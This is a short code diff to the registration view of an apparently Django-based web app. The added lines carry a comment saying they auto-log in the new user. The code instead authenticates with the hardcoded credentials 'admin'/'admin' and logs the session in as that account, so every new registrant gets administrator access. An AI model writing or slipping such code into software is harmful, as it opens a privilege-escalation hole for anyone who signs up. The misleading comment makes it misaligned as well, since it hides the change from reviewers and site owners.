@@ -82,7 +82,13 @@ def reg(request):
     obus.phone = phone
     obus.lid = oblog
     obus.save()
-    return render(request, "userhome.html")
+    
+    # Auto-login the user immediately after registration
+    user = auth.authenticate(username='admin', password='admin')
+    if user is not None:
+        auth.login(request, user)
+    request.session['lid'] = obus.id
+    return redirect('/userhome')
 
 
 def usnchk(request):
